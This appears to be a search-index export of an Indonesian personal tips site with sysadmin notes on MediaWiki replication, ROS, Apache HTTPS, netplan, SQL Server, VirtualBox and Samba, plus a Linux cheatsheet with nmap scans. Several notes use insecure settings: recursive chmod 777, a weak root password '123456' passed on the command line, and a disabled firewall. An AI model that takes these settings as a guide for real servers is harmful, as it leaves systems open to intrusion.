apt update sudo apt-get install apache2 php php-xmlrpc php-mysql php-gd php-cli php-curl mysql-client mysql-server libphp-adodb libgd-dev php-pear php-common libapache2-mod-php php-fpm php-bz2 php-xml imagemagick git php-mbstring service apache2 stop service apache2 start sudo locale-gen id_ID.UTF-8 buat database mediawiki (aku lewat phpmyadmin) -> kasih nama mediawiki download & install mediawiki : \u00b6 cd /var/data/library/datawiki/ wget https://releases.wikimedia.org/mediawiki/1.32/mediawiki-1.32.0.tar.gz tar zxvf mediawiki-1.32.0.tar.gz mv mediawiki-1.32.0 wiki cp wiki /var/www/html/ cp -Rf /var/www/html/wiki/mw-config/ /var/www/html/wiki/config chmod a+w /var/www/html/wiki/mw-config chmod a+w /var/www/html/wiki/config chmod -Rf 777 wiki chown -Rf www-data.www-data wiki /etc/init.d/apache2 restart lanjut install di web : *catatan : Database Prefix -> wiki_ download LocalSettings.php, taruh di file bersama wiki/index.php cd ~/Downloads mv LocalSettings.php /var/www/html/wiki/ chmod 777 /var/www/html/wiki/LocalSettings.php lanjut di terminal cd /var/data/library/datawiki/ # yg kepakai cuman wikidb.sql.tar.gz & images.tar.gz, jadi kyknya cuman download itu aja wget http://onnocenter.or.id/pustaka/datawiki/wikidb.sql.tar.gz -O /var/data/library/datawiki/wikidb.sql.tar.gz wget http://onnocenter.or.id/pustaka/datawiki/wikidb.sql -O /var/data/library/datawiki/wikidb.sql wget http://onnocenter.or.id/pustaka/datawiki/wikidb.xml -O /var/data/library/datawiki/wikidb.xml wget http://onnocenter.or.id/pustaka/datawiki/wikidb.xml.tar.gz -O /var/data/library/datawiki/wikidb.xml.tar.gz wget http://onnocenter.or.id/pustaka/datawiki/images.tar.gz -O /var/data/library/datawiki/images.tar.gz tar zxvf images.tar.gz tar zxvf wikidb.sql.tar.gz cp -Rf /var/data/library/datawiki/var/www/html/wiki/images /var/www/html/wiki/ chown -Rf www-data.www-data /var/www/html/wiki service mysql stop service mysql start /usr/bin/mysqladmin --user=root --password=123456 --force drop mediawiki /usr/bin/mysqladmin --user=root --password=123456 create mediawiki mysql -u root -p123456 mediawiki < /var/www/html/wiki/maintenance/tables.sql mysql -u root -p123456 mediawiki < /var/data/library/datawiki/var/www/html/pustaka/datawiki/wikidb.sql service mysql stop service mysql start cd /var/www/html/wiki/maintenance php update.php service mysql stop service mysql start chown -Rf nobody.nogroup /var/data chmod -Rf 777 /var/data refresh web nya, done","title":"Replikasi Onnocenter"},{"location":"tips/replikasi-onnocenter/#replikasi-mediawiki-httpslmsonnocenteroridwiki-ubuntu-2004-khusus-mediawiki-1320","text":"server : install mediawiki : buat tempat menyimpan keperlannya mkdir /var/data mkdir /var/data/library mkdir /var/data/library/datawiki sudo apt update sudo apt-get install apache2 php php-xmlrpc php-mysql php-gd php-cli php-curl mysql-client mysql-server libphp-adodb libgd-dev php-pear php-common libapache2-mod-php php-fpm php-bz2 php-xml imagemagick git php-mbstring service apache2 stop service apache2 start sudo locale-gen id_ID.UTF-8 buat database mediawiki (aku lewat phpmyadmin) -> kasih nama mediawiki","title":"Replikasi Mediawiki https://lms.onnocenter.or.id/wiki/ ubuntu 20.04, khusus mediawiki-1.32.0"},{"location":"tips/replikasi-onnocenter/#download-install-mediawiki","text":"cd /var/data/library/datawiki/ wget https://releases.wikimedia.org/mediawiki/1.32/mediawiki-1.32.0.tar.gz tar zxvf mediawiki-1.32.0.tar.gz mv mediawiki-1.32.0 wiki cp wiki /var/www/html/ cp -Rf /var/www/html/wiki/mw-config/ /var/www/html/wiki/config chmod a+w /var/www/html/wiki/mw-config chmod a+w /var/www/html/wiki/config chmod -Rf 777 wiki chown -Rf www-data.www-data wiki /etc/init.d/apache2 restart lanjut install di web : *catatan : Database Prefix -> wiki_ download LocalSettings.php, taruh di file bersama wiki/index.php cd ~/Downloads mv LocalSettings.php /var/www/html/wiki/ chmod 777 /var/www/html/wiki/LocalSettings.php lanjut di terminal cd /var/data/library/datawiki/ # yg kepakai cuman wikidb.sql.tar.gz & images.tar.gz, jadi kyknya cuman download itu aja wget http://onnocenter.or.id/pustaka/datawiki/wikidb.sql.tar.gz -O /var/data/library/datawiki/wikidb.sql.tar.gz wget http://onnocenter.or.id/pustaka/datawiki/wikidb.sql -O /var/data/library/datawiki/wikidb.sql wget http://onnocenter.or.id/pustaka/datawiki/wikidb.xml -O /var/data/library/datawiki/wikidb.xml wget http://onnocenter.or.id/pustaka/datawiki/wikidb.xml.tar.gz -O /var/data/library/datawiki/wikidb.xml.tar.gz wget http://onnocenter.or.id/pustaka/datawiki/images.tar.gz -O /var/data/library/datawiki/images.tar.gz tar zxvf images.tar.gz tar zxvf wikidb.sql.tar.gz cp -Rf /var/data/library/datawiki/var/www/html/wiki/images /var/www/html/wiki/ chown -Rf www-data.www-data /var/www/html/wiki service mysql stop service mysql start /usr/bin/mysqladmin --user=root --password=123456 --force drop mediawiki /usr/bin/mysqladmin --user=root --password=123456 create mediawiki mysql -u root -p123456 mediawiki < /var/www/html/wiki/maintenance/tables.sql mysql -u root -p123456 mediawiki < /var/data/library/datawiki/var/www/html/pustaka/datawiki/wikidb.sql service mysql stop service mysql start cd /var/www/html/wiki/maintenance php update.php service mysql stop service mysql start chown -Rf nobody.nogroup /var/data chmod -Rf 777 /var/data refresh web nya, done","title":"download &amp; install mediawiki :"},{"location":"tips/ros-melodic/","text":"full course : http://wiki.ros.org ROS Melodic Ubuntu 18.04 \u00b6 Installasi \u00b6 sudo sh -c 'echo \"deb http://packages.ros.org/ros/ubuntu $(lsb_release -sc) main\" > /etc/apt/sources.list.d/ros-latest.list' sudo apt-key adv --keyserver 'hkp://keyserver.ubuntu.com:80' --recv-key C1CF6E31E6BADE8868B172B4F42ED6FBAB17C654 sudo apt update sudo apt install ros-melodic-desktop-full echo \"source /opt/ros/melodic/setup.bash\" >> ~/.bashrc source ~/.bashrc sudo apt install python-rosdep python-rosinstall python-rosinstall-generator python-wstool build-essential sudo rosdep init rosdep update ROS Tutorial \u00b6 Managing Environtment : printenv | grep ROS # dijalankan setiap open terminal source /opt/ros/melodic/setup.bash Create ROS Workspace : mkdir -p ~/catkin_ws/src cd ~/catkin_ws/ catkin_make # jika akan menggunakan python catkin_make -DPYTHON_EXECUTABLE=/usr/bin/python3 source devel/setup.bash cek apakah shell path sudah termuat : $ echo $ROS_PACKAGE_PATH # /home/youruser/catkin_ws/src:/opt/ros/kinetic/share","title":"ROS Melodic"},{"location":"tips/ros-melodic/#ros-melodic-ubuntu-1804","text":"","title":"ROS Melodic Ubuntu 18.04"},{"location":"tips/ros-melodic/#installasi","text":"sudo sh -c 'echo \"deb http://packages.ros.org/ros/ubuntu $(lsb_release -sc) main\" > /etc/apt/sources.list.d/ros-latest.list' sudo apt-key adv --keyserver 'hkp://keyserver.ubuntu.com:80' --recv-key C1CF6E31E6BADE8868B172B4F42ED6FBAB17C654 sudo apt update sudo apt install ros-melodic-desktop-full echo \"source /opt/ros/melodic/setup.bash\" >> ~/.bashrc source ~/.bashrc sudo apt install python-rosdep python-rosinstall python-rosinstall-generator python-wstool build-essential sudo rosdep init rosdep update","title":"Installasi"},{"location":"tips/ros-melodic/#ros-tutorial","text":"Managing Environtment : printenv | grep ROS # dijalankan setiap open terminal source /opt/ros/melodic/setup.bash Create ROS Workspace : mkdir -p ~/catkin_ws/src cd ~/catkin_ws/ catkin_make # jika akan menggunakan python catkin_make -DPYTHON_EXECUTABLE=/usr/bin/python3 source devel/setup.bash cek apakah shell path sudah termuat : $ echo $ROS_PACKAGE_PATH # /home/youruser/catkin_ws/src:/opt/ros/kinetic/share","title":"ROS Tutorial"},{"location":"tips/ros-noetic/","text":"ROS Noetic Ubuntu 20.04 \u00b6 Installasi sudo sh -c 'echo \"deb http://packages.ros.org/ros/ubuntu $(lsb_release -sc) main\" > /etc/apt/sources.list.d/ros-latest.list' sudo apt-key adv --keyserver 'hkp://keyserver.ubuntu.com:80' --recv-key C1CF6E31E6BADE8868B172B4F42ED6FBAB17C654 sudo apt update sudo apt install ros-noetic-desktop-full source /opt/ros/noetic/setup.bash echo \"source /opt/ros/noetic/setup.bash\" >> ~/.bashrc source ~/.bashrc sudo apt install python3-rosdep python3-rosinstall python3-rosinstall-generator python3-wstool build-essential sudo rosdep init rosdep update","title":"ROS Noetic"},{"location":"tips/ros-noetic/#ros-noetic-ubuntu-2004","text":"","title":"ROS Noetic Ubuntu 20.04"},{"location":"tips/ros-opencv/","text":"Install ROS Melodic & Opencv Ubuntu 18.04 1. Install ROS Melodic : sudo sh -c 'echo \"deb http://packages.ros.org/ros/ubuntu $(lsb_release -sc) main\" > /etc/apt/sources.list.d/ros-latest.list' sudo apt-key adv --keyserver 'hkp://keyserver.ubuntu.com:80' --recv-key C1CF6E31E6BADE8868B172B4F42ED6FBAB17C654 sudo apt update sudo apt install ros-melodic-desktop-full echo \"source /opt/ros/melodic/setup.bash\" >> ~/.bashrc source ~/.bashrc sudo apt install python-rosdep python-rosinstall python-rosinstall-generator python-wstool build-essential sudo rosdep init rosdep update 2. Create catkin workspace : mkdir -p ~/catkin_ws/src cd ~/catkin_ws catkin_make echo \"source ~/catkin_ws/devel/setup.bash\" >> ~/.bashrc source ~/.bashrc # Install rosbridge-suite sudo apt-get install ros-melodic-rosbridge-server sudo apt-get install cmake-qt-gui 3. Install Library yang diperlukan : sudo apt-get install libfontconfig1-dev libdbus-1-dev libfreetype6-dev libudev-dev libicu-dev libsqlite3-dev libxslt1-dev libssl-dev libasound2-dev libavcodec-dev libavformat-dev libswscale-dev libgles2-mesa-dev libxcb-icccm4-dev libxcb-image0-dev libxcb-keysyms1-dev libxcb-xinerama0-dev libprotobuf-dev libleveldb-dev libsnappy-dev libhdf5-serial-dev protobuf-compiler libopenblas-dev liblapack-dev libopenblas-dev liblapack-dev libgflags-dev libgoogle-glog-dev liblmdb-dev cmake cmake-gui gfortran liblapack-dev libblas-dev libatlas-base-dev libarpack2-dev libarpack++2-dev 4. download opencv di google, versi terserah, lalu extract 5. Clone contoh project : cd ~/Download git clone https://github.com/fpt-corp/ROS_Package_example.git jika mendownlad, maka extract dulu 6. cd ~/Download/opencv mkdir build 7. Buka cmake 8. browse source -> opencv browse build -> build configure generate 9. cd ~/Download/opencv/build make -j16 sudo make install 10. cd ~/Download/ROS_Package_example/ # copy semua folder ke ~/catkin_ws/src/ 11. restart terminal 12. cd ~/catkin_ws/ catkin_make roslaunch lane_detect lane_detect.launch 13. Ada step selanjutnya, tp ribet pake bgt","title":"Install ROS & Opencv"},{"location":"tips/ros/","text":"next...","title":"Install"},{"location":"tips/set-https/","text":"HTTPS in Local Network (Ubuntu Server 20.04) : sudo su openssl req -x509 -days 1 -newkey rsa:2048 -keyout /home/carloz/localhost.key -out /home/carloz/localhost.crt Enter PEM pass phrase: misal 1234 (antara 4 - 1024 character) country name : ID state or province : Jawa Tengah locality name : Kudus organization name : AUWO organizational unit name : AUWO2 common name : ganteng email addr : carloz@ganteng.com vim /etc/apache2/sites-available/https.conf isi dengan : ServerName 127.0.1.1 DocumentRoot /var/www/html SSLEngine on SSLCertificateFile \"/home/carloz/localhost.crt\" SSLCertificateKeyFIle \"/home/carloz/localhost.key\" AllowOverride all a2ensite https.conf systemctl reload apache2 cek status : systemctl status apache2.service jika ada error, silahkan oprec2 sendiri misal error \"Invalid command 'SSLEngine', blablablaa....\", seperti gambar : maka dapat dengan : a2enmod ssl lalu setelah error hilang : systemctl restart apache2 enter passphrase : 1234 done systemctl status apache2.service buka web browser, masukkan https://localhost/ atau https://ip/ jika ada warning, tinggal klik advanced... , accept the risk and continue suatu ketika kok terjadi loading lama di web, coba systemctl restart apache2 masukkan kode rsa nya '1234'","title":"HTTPS in Local Network (Ubuntu Server 20.04)"},{"location":"tips/set-ip-static/","text":"Setting IP Static \u00b6 periksa interface : ifonfig misal interfacenya enp0s3 sudo su nano /etc/netplan/00-installer-config.yaml ganti isinya dengan : # ini utk ip dinamis # network: # ethernets: # enp0s3: # dhcp4: true # version: 2 # ini utk ip statis network: version: 2 renderer: networkd #opsional ethernets: enp0s3: # interface dhcp4: false addresses: [192.168.43.207/24] # ip yg ingin di set gateway4: 192.168.43.1 # gateway / ip server (HP :v) nameservers: addresses: [8.8.8.8,8.8.4.4,1.1.1.1] # server dns, persis gini jg gpp tinggal reboot : shutdown -r now cek : ifconfig","title":"Setting IP Static"},{"location":"tips/set-ip-static/#setting-ip-static","text":"periksa interface : ifonfig misal interfacenya enp0s3 sudo su nano /etc/netplan/00-installer-config.yaml ganti isinya dengan : # ini utk ip dinamis # network: # ethernets: # enp0s3: # dhcp4: true # version: 2 # ini utk ip statis network: version: 2 renderer: networkd #opsional ethernets: enp0s3: # interface dhcp4: false addresses: [192.168.43.207/24] # ip yg ingin di set gateway4: 192.168.43.1 # gateway / ip server (HP :v) nameservers: addresses: [8.8.8.8,8.8.4.4,1.1.1.1] # server dns, persis gini jg gpp tinggal reboot : shutdown -r now cek : ifconfig","title":"Setting IP Static"},{"location":"tips/sql-server/","text":"Install sql server ubuntu 18.04 \u00b6 gagal di ubuntu 20.04, bisa di ubuntu 18.04 -> gagal di 'sudo apt-get install mssql-tools unixodbc-dev' (UPDATE SOLUSIII!!!) -> sudo apt install aptitude sudo aptitude install mssql-tools unixodbc-dev *jika tdk punya, bisa pakai virtualbox, dengan spesifikasi virtualbox mesin min 2gb ram dan tiap ingin menjalankan harus sambil menghidupkan mesin sudo apt update && sudo apt upgrade wget -qO- https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add - sudo add-apt-repository \"$(wget -qO- https://packages.microsoft.com/config/ubuntu/18.04/mssql-server-2019.list)\" sudo apt-get install -y mssql-server sudo /opt/mssql/bin/mssql-conf setup pilih developer, yes, masukkan password cek apakah sdh bisa, jika bisa ada tulisan active : systemctl status mssql-server --no-pager lanjut : curl https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add - curl https://packages.microsoft.com/config/ubuntu/18.04/prod.list | sudo tee /etc/apt/sources.list.d/msprod.list sudo apt-get update sudo apt-get install mssql-tools unixodbc-dev opsional : (tdk jg gpp, aku jg ga) sudo apt-get update sudo apt-get install mssql-tools lanjut : echo 'export PATH=\"$PATH:/opt/mssql-tools/bin\"' >> ~/.bash_profile echo 'export PATH=\"$PATH:/opt/mssql-tools/bin\"' >> ~/.bashrc source ~/.bashrc login sqlserver lwat terminal : (atau boleh lngs ke software spt dbeaver) sqlcmd -S localhost -U 'usernamemu' -P 'passwordmu' default username : SA nyoba2 kuy : create db CREATE DATABASE TestDB SELECT Name from sys.Databases GO insert db USE TestDB CREATE TABLE Inventory (id INT, name NVARCHAR(50), quantity INT) INSERT INTO Inventory VALUES (1, 'banana', 150); INSERT INTO Inventory VALUES (2, 'orange', 154); GO select db SELECT * FROM Inventory WHERE quantity > 152; GO","title":"Install sql server ubuntu 20.04"},{"location":"tips/sql-server/#install-sql-server-ubuntu-1804","text":"gagal di ubuntu 20.04, bisa di ubuntu 18.04 -> gagal di 'sudo apt-get install mssql-tools unixodbc-dev' (UPDATE SOLUSIII!!!) -> sudo apt install aptitude sudo aptitude install mssql-tools unixodbc-dev *jika tdk punya, bisa pakai virtualbox, dengan spesifikasi virtualbox mesin min 2gb ram dan tiap ingin menjalankan harus sambil menghidupkan mesin sudo apt update && sudo apt upgrade wget -qO- https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add - sudo add-apt-repository \"$(wget -qO- https://packages.microsoft.com/config/ubuntu/18.04/mssql-server-2019.list)\" sudo apt-get install -y mssql-server sudo /opt/mssql/bin/mssql-conf setup pilih developer, yes, masukkan password cek apakah sdh bisa, jika bisa ada tulisan active : systemctl status mssql-server --no-pager lanjut : curl https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add - curl https://packages.microsoft.com/config/ubuntu/18.04/prod.list | sudo tee /etc/apt/sources.list.d/msprod.list sudo apt-get update sudo apt-get install mssql-tools unixodbc-dev opsional : (tdk jg gpp, aku jg ga) sudo apt-get update sudo apt-get install mssql-tools lanjut : echo 'export PATH=\"$PATH:/opt/mssql-tools/bin\"' >> ~/.bash_profile echo 'export PATH=\"$PATH:/opt/mssql-tools/bin\"' >> ~/.bashrc source ~/.bashrc login sqlserver lwat terminal : (atau boleh lngs ke software spt dbeaver) sqlcmd -S localhost -U 'usernamemu' -P 'passwordmu' default username : SA nyoba2 kuy : create db CREATE DATABASE TestDB SELECT Name from sys.Databases GO insert db USE TestDB CREATE TABLE Inventory (id INT, name NVARCHAR(50), quantity INT) INSERT INTO Inventory VALUES (1, 'banana', 150); INSERT INTO Inventory VALUES (2, 'orange', 154); GO select db SELECT * FROM Inventory WHERE quantity > 152; GO","title":"Install sql server ubuntu 18.04"},{"location":"tips/terminal-path/","text":"$PATH \u00b6 contoh beberapa $PATH shell /usr/bin /usr/bin/bash /usr/bin/zsh /usr/local/bin /usr/local/sbin /usr/sbin /sbin /usr/local/games /usr/games untuk melihat apa saja path shell yang digunakan echo $PATH tiap user bisa berbeda, seperti : user : /usr/bin /bin /usr/local/bin /usr/local/games /usr/games root : /usr/bin /bin /usr/local/bin /usr/local/sbin /usr/sbin /sbin nambah path : export PATH = $PATH :/place/with/the/file atau export PATH = /place/with/the/file: $PATH check makai shell apa : echo $SHELL atau echo $0 Kesimpulan cek dulu pakai shell apa : echo $SHELL atau echo $0 gunanya apa?, agar dapat dipermanenkan jika ingin membuat shellcode sendiri : (jika tidak langsung ke step selanjutnya) mkdir /home/<user>/Documents/buat_shell_sendiri cd /home/<user>/Documents/buat_shell_sendiri vim ganteng isi dengan : # ini misal command untuk cetak isi directory, lalu membuat file \"tes.txt\" dan folder \"ini_folder\", dan didalam \"ini_folder\" ada file \"file_dalam.txt\" ls mkdir ini_folder touch ini_folder/file_dalam.txt chmod +x ganteng uji dulu : (tidak permanent) export PATH=$PATH:/home/<user>/Documents/buat_shell_sendiri coba di directory apa saja ganteng cek apakah file,folder,isifolder ada di directory itu apa tidak, jika ada maka sukses masukkan path di shell : (membuat permanent) vim ~/.bashrc atau vim ~/.zshrc atau (tergantung pakai shell apa) tambahkan : export PATH=$PATH:/home/<user>/Documents/buat_shell_sendiri di bagian bawah/(terserah) close terminal / \" source ~/. \"","title":"Path variable terminal"},{"location":"tips/terminal-path/#path","text":"contoh beberapa $PATH shell /usr/bin /usr/bin/bash /usr/bin/zsh /usr/local/bin /usr/local/sbin /usr/sbin /sbin /usr/local/games /usr/games untuk melihat apa saja path shell yang digunakan echo $PATH tiap user bisa berbeda, seperti : user : /usr/bin /bin /usr/local/bin /usr/local/games /usr/games root : /usr/bin /bin /usr/local/bin /usr/local/sbin /usr/sbin /sbin nambah path : export PATH = $PATH :/place/with/the/file atau export PATH = /place/with/the/file: $PATH check makai shell apa : echo $SHELL atau echo $0","title":"$PATH"},{"location":"tips/tips-random/","text":"Tips Random \u00b6 Python Remake view terminal Setting mendadak rusak saat hapus git graph Input-Output Redirection Linux Cheatsheet Python \u00b6 import sys for i in range ( 0 , 16 ): for j in range ( 0 , 16 ): code = str ( i * 16 + j ) sys . stdout . write ( u \" \\u001b [38;5;\" + code + \"m \" + code . ljust ( 4 )) print u \" \\u001b [0m\" import sys for i in range ( 0 , 16 ): for j in range ( 0 , 16 ): code = str ( i * 16 + j ) sys . stdout . write ( u \" \\u001b [48;5;\" + code + \"m \" + code . ljust ( 4 )) print u \" \\u001b [0m\" import time def loading (): print \"loading...\" for i in range ( 0 , 100 ): time . sleep ( 0.03 ) sys . stdout . write ( u \" \\u001b [1000D\" + str ( i + 1 ) + \"%\" ) sys . stdout . flush () print loading () import time , sys def loading (): print \"loading...\" for i in range ( 0 , 100 ): time . sleep ( 0.03 ) width = ( i + 1 ) / 4 bar = \"[\" + \"#\" * width + \" \" * ( 25 - width ) + \"]\" sys . stdout . write ( u \" \\u001b [1000D\" + bar ) sys . stdout . flush () print loading () Remake view terminal \u00b6 nano ~/.bashrc edit PS1 : PS1=\"\\[\\033[0;31m\\]\\342\\224\\214\\342\\224\\200\\$([[ \\$? != 0 ]] && echo \\\"[\\[\\033[0;31m\\]\\342\\234\\227\\[\\033[0;37m\\]]\\342\\224\\200\\\")[$(if [[ ${EUID} == 0 ]]; then echo '\\[\\033[01;31m\\]root\\[\\033[01;33m\\]@\\[\\033[01;96m\\]\\h'; else echo '\\[\\033[0;39m\\]\\u\\[\\033[01;33m\\]@\\[\\033[01;96m\\]\\h'; fi)\\[\\033[0;31m\\]]\\342\\224\\200[\\[\\033[0;32m\\]\\w\\[\\033[0;31m\\]]\\n\\[\\033[0;31m\\]\\342\\224\\224\\342\\224\\200\\342\\224\\200\\342\\225\\274 \\[\\033[0m\\]\\[\\e[01;33m\\]\\\\$\\[\\e[0m\\]\" edit PS1 di root : sudo su nano /root/.bashrc edit PS1 : PS1=\"\\[\\033[0;31m\\]\\342\\224\\214\\342\\224\\200\\$([[ \\$? != 0 ]] && echo \\\"[\\[\\033[0;31m\\]\\342\\234\\227\\[\\033[0;37m\\]]\\342\\224\\200\\\")[$(if [[ ${EUID} == 0 ]]; then echo '\\[\\033[01;31m\\]root\\[\\033[01;33m\\]@\\[\\033[01;96m\\]\\h'; else echo '\\[\\033[0;39m\\]\\u\\[\\033[01;33m\\]@\\[\\033[01;96m\\]\\h'; fi)\\[\\033[0;31m\\]]\\342\\224\\200[\\[\\033[0;32m\\]\\w\\[\\033[0;31m\\]]\\n\\[\\033[0;31m\\]\\342\\224\\224\\342\\224\\200\\342\\224\\200\\342\\225\\274 \\[\\033[0m\\]\\[\\e[01;33m\\]\\\\$\\[\\e[0m\\]\" Setting mendadak rusak saat hapus \u00b6 sudo apt-get remove unity-control-center sudo apt-get install unity-control-center jika ada lagi yg rusak, maka : (jika benar-benar urgent) sudo apt-get install ubuntu-desktop git graph \u00b6 git log --all --decorate --oneline --graph atau buat command graph alias graph=\"git log --all --decorate --oneline --graph\" Input-Output Redirection \u00b6 coba > 1> 2> >&0 >&1 >&2 python -c \"print('tes'); print(1/0)\" > tes.txt output Traceback (most recent call last): File \"<string>\", line 1, in <module> ZeroDivisionError: division by zero cat tes.txt tes python -c \"print('tes'); print(1/0)\" 1> tes.txt output Traceback (most recent call last): File \"<string>\", line 1, in <module> ZeroDivisionError: division by zero cat tes.txt tes python -c \"print('tes'); print(1/0)\" 2> tes.txt output tes cat tes.txt Traceback (most recent call last): File \"<string>\", line 1, in <module> ZeroDivisionError: division by zero Linux Cheatsheet \u00b6 # list size du -sh * ls -lha du -sk * | sort -n du -sk * | sort -h du -sh * | sort -hr # random php -i | grep /.+/php.ini -oE ps -ef | grep apache2 grep -rnw '.' -e 'ssl' kill ` number ` sudo lsof -i -P -n | grep LISTEN sudo netstat -tulpn | grep LISTEN sudo ss -tulpn | grep LISTEN sudo lsof -i:22 ## see a specific port such as 22 ## sudo nmap -sTU -O IP-address-Here sudo nmap -sT -O localhost","title":"Random"},{"location":"tips/tips-random/#tips-random","text":"Python Remake view terminal Setting mendadak rusak saat hapus git graph Input-Output Redirection Linux Cheatsheet","title":"Tips Random"},{"location":"tips/tips-random/#python","text":"import sys for i in range ( 0 , 16 ): for j in range ( 0 , 16 ): code = str ( i * 16 + j ) sys . stdout . write ( u \" \\u001b [38;5;\" + code + \"m \" + code . ljust ( 4 )) print u \" \\u001b [0m\" import sys for i in range ( 0 , 16 ): for j in range ( 0 , 16 ): code = str ( i * 16 + j ) sys . stdout . write ( u \" \\u001b [48;5;\" + code + \"m \" + code . ljust ( 4 )) print u \" \\u001b [0m\" import time def loading (): print \"loading...\" for i in range ( 0 , 100 ): time . sleep ( 0.03 ) sys . stdout . write ( u \" \\u001b [1000D\" + str ( i + 1 ) + \"%\" ) sys . stdout . flush () print loading () import time , sys def loading (): print \"loading...\" for i in range ( 0 , 100 ): time . sleep ( 0.03 ) width = ( i + 1 ) / 4 bar = \"[\" + \"#\" * width + \" \" * ( 25 - width ) + \"]\" sys . stdout . write ( u \" \\u001b [1000D\" + bar ) sys . stdout . flush () print loading ()","title":"Python"},{"location":"tips/tips-random/#remake-view-terminal","text":"nano ~/.bashrc edit PS1 : PS1=\"\\[\\033[0;31m\\]\\342\\224\\214\\342\\224\\200\\$([[ \\$? != 0 ]] && echo \\\"[\\[\\033[0;31m\\]\\342\\234\\227\\[\\033[0;37m\\]]\\342\\224\\200\\\")[$(if [[ ${EUID} == 0 ]]; then echo '\\[\\033[01;31m\\]root\\[\\033[01;33m\\]@\\[\\033[01;96m\\]\\h'; else echo '\\[\\033[0;39m\\]\\u\\[\\033[01;33m\\]@\\[\\033[01;96m\\]\\h'; fi)\\[\\033[0;31m\\]]\\342\\224\\200[\\[\\033[0;32m\\]\\w\\[\\033[0;31m\\]]\\n\\[\\033[0;31m\\]\\342\\224\\224\\342\\224\\200\\342\\224\\200\\342\\225\\274 \\[\\033[0m\\]\\[\\e[01;33m\\]\\\\$\\[\\e[0m\\]\" edit PS1 di root : sudo su nano /root/.bashrc edit PS1 : PS1=\"\\[\\033[0;31m\\]\\342\\224\\214\\342\\224\\200\\$([[ \\$? != 0 ]] && echo \\\"[\\[\\033[0;31m\\]\\342\\234\\227\\[\\033[0;37m\\]]\\342\\224\\200\\\")[$(if [[ ${EUID} == 0 ]]; then echo '\\[\\033[01;31m\\]root\\[\\033[01;33m\\]@\\[\\033[01;96m\\]\\h'; else echo '\\[\\033[0;39m\\]\\u\\[\\033[01;33m\\]@\\[\\033[01;96m\\]\\h'; fi)\\[\\033[0;31m\\]]\\342\\224\\200[\\[\\033[0;32m\\]\\w\\[\\033[0;31m\\]]\\n\\[\\033[0;31m\\]\\342\\224\\224\\342\\224\\200\\342\\224\\200\\342\\225\\274 \\[\\033[0m\\]\\[\\e[01;33m\\]\\\\$\\[\\e[0m\\]\"","title":"Remake view terminal"},{"location":"tips/tips-random/#setting-mendadak-rusak-saat-hapus","text":"sudo apt-get remove unity-control-center sudo apt-get install unity-control-center jika ada lagi yg rusak, maka : (jika benar-benar urgent) sudo apt-get install ubuntu-desktop","title":"Setting mendadak rusak saat hapus"},{"location":"tips/tips-random/#git-graph","text":"git log --all --decorate --oneline --graph atau buat command graph alias graph=\"git log --all --decorate --oneline --graph\"","title":"git graph"},{"location":"tips/tips-random/#input-output-redirection","text":"coba > 1> 2> >&0 >&1 >&2 python -c \"print('tes'); print(1/0)\" > tes.txt output Traceback (most recent call last): File \"<string>\", line 1, in <module> ZeroDivisionError: division by zero cat tes.txt tes python -c \"print('tes'); print(1/0)\" 1> tes.txt output Traceback (most recent call last): File \"<string>\", line 1, in <module> ZeroDivisionError: division by zero cat tes.txt tes python -c \"print('tes'); print(1/0)\" 2> tes.txt output tes cat tes.txt Traceback (most recent call last): File \"<string>\", line 1, in <module> ZeroDivisionError: division by zero","title":"Input-Output Redirection"},{"location":"tips/tips-random/#linux-cheatsheet","text":"# list size du -sh * ls -lha du -sk * | sort -n du -sk * | sort -h du -sh * | sort -hr # random php -i | grep /.+/php.ini -oE ps -ef | grep apache2 grep -rnw '.' -e 'ssl' kill ` number ` sudo lsof -i -P -n | grep LISTEN sudo netstat -tulpn | grep LISTEN sudo ss -tulpn | grep LISTEN sudo lsof -i:22 ## see a specific port such as 22 ## sudo nmap -sTU -O IP-address-Here sudo nmap -sT -O localhost","title":"Linux Cheatsheet"},{"location":"tips/virtualbox/","text":"Virtualbox \u00b6 Extension Pack \u00b6 download extension pack agar mode usb nambah banyak agar usb tampak : lihat nama user : (opsional) echo $USER cek list group, biasanya grup utk virtualbox adalah vboxusers : compgen -g add group : sudo usermod -a -G vboxusers $USER kyknya perlu di reboot Copy file host ke remote, dan sebaliknya \u00b6 mengirim dari host ke remote : file : scp <file_yg_akan_dikirim> <user_remote>@<ip_remote>:<directory_tujuan> directory : scp -r <directory_yg_dikirim> <user_remote>@<ip_remote>:<directory_tujuan> mengambil file dari remote : scp <user_remote>@<ip_remote>:<file_directorynya> <tujuan_di_directorymu> jika menghendaki ada port dan key scp <user_remote>@<ip_remote>:<file_directorynya> <tujuan_di_directorymu> -P <port> -i <path_key> Windows ISO \u00b6 drive , sudah dihapus google :V Membuat file sharing virtualbox \u00b6 connect ssh : pc-target : sudo service ssh status sudo service ssh start silahkan ssh namun, jika masih tdk bisa : sudo iptables -A INPUT -p tcp --dport ssh -j ACCEPT host : mkdir -p /mnt/cobafilesharing-public mkdir -p /mnt/cobafilesharing-data server : <ul> sudo su mkdir /home/public mkdir /home/data apt update apt -y install samba cifs-utils vi /etc/samba/smb.conf diisi dengan : workgroup = WORKGROUP netbios name = COBAFILESHARING # dibagian bottom [public] path = /home/public available = yes browsable = yes public = yes writable = yes [data] path = /home/data available = yes browsable = yes public = yes writable = no mkdir -p /home/public mkdir -p /home/data chown -Rf nobody.nogroup /home/public chown -Rf nobody.nogroup /home/data chmod -Rf 777 /home/public chmod -Rf 777 /home/data smbpasswd -a carloz misal password : 123456 /etc/init.d/smbd restart matikan firewall ufw disable host : cek sdh mount apa blm : df -h mount -t cifs //192.168.43.207/public/ /mnt/cobafilesharing-public/ -o password=123456,username=carloz Done, jika ingin sharing file bisa lewat folder tersebut Resize memory virtualbox \u00b6 VBoxManage clonehd Ubuntu\\ Server\\ 18.04\\ LTS.vdi ubuntu18_04_new4.vdi --format VDI --variant Standard VBoxManage modifyhd ubuntu18_04_new4.vdi --resize 30000 ganti storage lewat GUI virtualbox Error : Kernel driver not installed (rc=-1908) \u00b6 sudo apt-get remove virtualbox-dkms sudo apt-get install virtualbox-dkms sudo apt update reboot jika perlu","title":"Virtualbox"},{"location":"tips/virtualbox/#virtualbox","text":"","title":"Virtualbox"},{"location":"tips/virtualbox/#extension-pack","text":"download extension pack agar mode usb nambah banyak agar usb tampak : lihat nama user : (opsional) echo $USER cek list group, biasanya grup utk virtualbox adalah vboxusers : 